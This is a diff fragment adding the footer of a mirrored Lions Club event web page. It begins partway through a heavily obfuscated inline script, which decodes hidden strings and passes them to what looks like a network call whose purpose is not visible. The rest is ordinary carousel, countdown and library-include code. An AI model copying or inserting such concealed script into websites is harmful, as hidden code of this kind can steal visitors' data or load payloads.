Tv4tPW[0x1a]}aC6mpCb[Y_HYuE+sqLCHI]=Tv4tPW[0x19];return Tv4tPW[0x19]},console.log(aC6mpCb))}return Number(aC6mpCb)===Tv4tPW[0x1]})},bl:()=>{function aC6mpCb(aC6mpCb){var uMDUQD="ED1qgbO}>fk?`u_LP[5v{Rc7*nKzajdx]eQW~=r+Z$<0t!,AHTpF:#BC2oSm4G.(sJN9wyV|%ilY\"@IMhX&^3)/6;8U",Y_HYuE,sqLCHI,wtEncTZ,tTg8zg,YVddCSx,NnPU4ii,iaf3s95;nFm2ZK(Y_HYuE=""+(aC6mpCb||""),sqLCHI=Y_HYuE.length,wtEncTZ=[],tTg8zg=Tv4tPW[0x0],YVddCSx=Tv4tPW[0x0],NnPU4ii=-Tv4tPW[0x1]);for(iaf3s95=Tv4tPW[0x0];iaf3s95<sqLCHI;iaf3s95++){var _2yi8I=uMDUQD.indexOf(Y_HYuE[iaf3s95]);if(_2yi8I===-Tv4tPW[0x1])continue;if(NnPU4ii<Tv4tPW[0x0]){NnPU4ii=_2yi8I}else{nFm2ZK(NnPU4ii+=_2yi8I*Tv4tPW[0xc],tTg8zg|=NnPU4ii<<YVddCSx,YVddCSx+=(NnPU4ii&Tv4tPW[0xd])>Tv4tPW[0xe]?Tv4tPW[0xf]:Tv4tPW[0x10]);do{nFm2ZK(wtEncTZ.push(tTg8zg&Tv4tPW[0x3]),tTg8zg>>=Tv4tPW[0x2],YVddCSx-=Tv4tPW[0x2])}while(YVddCSx>Tv4tPW[0x9]);NnPU4ii=-Tv4tPW[0x1]}}if(NnPU4ii>-Tv4tPW[0x1]){wtEncTZ.push((tTg8zg|NnPU4ii<<YVddCSx)&Tv4tPW[0x3])}return mOhVFo(wtEncTZ)}function uMDUQD(uMDUQD){if(typeof tGsPKO[uMDUQD]===Tv4tPW[0x5]){return tGsPKO[uMDUQD]=aC6mpCb(i0nlK9q[uMDUQD])}return tGsPKO[uMDUQD]}return L0oMOV(uMDUQD(0xa0),{[uMDUQD(0xa1)]:mGpI_5g,[uMDUQD(0xa2)]:RDNdeKM})[uMDUQD(0xa3)](()=>{})}})}aC6mpCb()})();
+</script>
+    </div>
+<a href="#" title="to Top" class="scrollup"><i class="fa fa-angle-up active"></i></a>
+<script>
+  /*AOS.init()*/
+  document.addEventListener("DOMContentLoaded", function () {
+  // Select all <ul class="menu"> only inside .footer2 widget
+  const footerMenus = document.querySelectorAll(".widget.footer2 ul.menu");
+
+  footerMenus.forEach(function (ul) {
+    ul.className = "link-list";  // Replace all classes with only "link-list"
+    ul.removeAttribute("id");    // Remove the id attribute
+  });
+});
+
+</script>
+<!--Event Carousel-->
+<script>
+(function(){
+  var root = document.getElementById('');
+  if(!root) return;
+  var track = root.querySelector('.lcb2-track');
+  var slides= [].slice.call(root.querySelectorAll('.lcb2-slide'));
+  var prev  = root.querySelector('.lcb2-prev');
+  var next  = root.querySelector('.lcb2-next');
+  var i=0, n=slides.length;
+  if(n<2){ prev.style.display=next.style.display='none'; }
+
+  function go(idx){ i=(idx+n)%n; track.style.transform='translateX('+(-i*100)+'%)'; }
+  function step(dir){ go(i+(dir||1)); }
+
+  var timer, AUTOPLAY=0;
+  function start(){ if(AUTOPLAY>0) timer=setInterval(function(){ step(1); }, AUTOPLAY); }
+  function stop(){ if(timer) clearInterval(timer); }
+
+  prev.addEventListener('click', function(){ stop(); step(-1); start(); });
+  next.addEventListener('click', function(){ stop(); step(1);  start(); });
+  root.addEventListener('mouseenter', stop);
+  root.addEventListener('mouseleave', start);
+
+  // Countdown per slide
+  function pad(n){ return (n<10?'0':'')+n; }
+  function tick(){
+    var now = Date.now();
+    root.querySelectorAll('.lcb2-timer').forEach(function(el){
+      // find the sibling hidden input (date) within the same slide
+      var slide = el.closest('.lcb2-slide');
+      if(!slide) return;
+      var hidden = slide.querySelector('input[name="date"]');
+      if(!hidden) return;
+      var tstr = hidden.value;
+      if(!tstr) return;
+      var t = new Date(tstr).getTime();
+      var diff = Math.max(0, Math.floor((t - now)/1000));
+      var d=Math.floor(diff/86400);
+      var h=Math.floor((diff%86400)/3600);
+      var m=Math.floor((diff%3600)/60);
+      var s=diff%60;
+      var map={days:d, hours:pad(h), minutes:pad(m), seconds:pad(s)};
+      el.querySelectorAll('[data-unit]').forEach(function(box){
+        var u=box.getAttribute('data-unit');
+        if(map[u]!==undefined){ box.firstChild.nodeValue=map[u]; }
+      });
+    });
+  }
+  tick(); setInterval(tick, 1000);
+
+  go(0); start();
+})();
+</script>
+<!--Event Carousel-->
+<script type="text/javascript">
+jQuery(function() {
+  // Owl Carousel
+  var owl = jQuery(".owl-carousel");
+  owl.owlCarousel({
+                loop: true,
+                margin: 10,
+                nav: true,
+                autoplay: true,
+                autoplayTimeout: 3500,
+                autoplayHoverPause: false,
+                items: 1,
+                smartSpeed: 1000
+  });
+});
+</script>
+<script src="../wp-content/themes/lionsclub/assets/frontend/js/jquery.js"></script>
+<script src="../wp-content/themes/lionsclub/assets/frontend/js/jquery.easing.1.3.js"></script>
+<script src="../wp-content/themes/lionsclub/assets/frontend/js/bootstrap.min.js"></script>
+<script src="../wp-content/themes/lionsclub/assets/frontend/js/jquery.fancybox.pack.js"></script>
+<script src="../wp-content/themes/lionsclub/assets/frontend/js/jquery.fancybox-media.js"></script>
+<script src="../wp-content/themes/lionsclub/assets/frontend/js/google-code-prettify/prettify.js"></script>
+<script src="../wp-content/themes/lionsclub/assets/frontend/js/portfolio/jquery.quicksand.js"></script>
+<script src="../wp-content/themes/lionsclub/assets/frontend/js/portfolio/setting.js"></script>
+<script src="../wp-content/themes/lionsclub/assets/frontend/js/jquery.flexslider.js"></script>
+<script src="../wp-content/themes/lionsclub/assets/frontend/js/animate.js"></script>
+<script src="../wp-content/themes/lionsclub/assets/frontend/js/Chart.min.js"></script>
+<script src="../../unpkg.com/aos%402.3.1/dist/aos.js"></script>
+<script src="../../code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="../../code.jquery.com/ui/1.12.1/jquery-ui.min.js"></script>
+<script src="../../code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="../../code.jquery.com/ui/1.12.1/jquery-ui.min.js"></script>
+<script src="../../cdn.datatables.net/1.11.5/js/jquery.dataTables.min.js"></script>
+<script src="../wp-content/themes/lionsclub/assets/frontend/js/owl-carousel/owl.carousel.js"></script>
+<script src="../../cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/owl.carousel.js"></script>
+<script src="../wp-content/themes/lionsclub/assets/frontend/js/custom.js"></script>
+<script src="../wp-content/themes/lionsclub/assets/frontend/js/customsearch.js"></script>
+</body>
+
+<!-- Mirrored from lionsclubbls.org/event/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 02 Jul 2026 08:52:00 GMT -->
+</html>
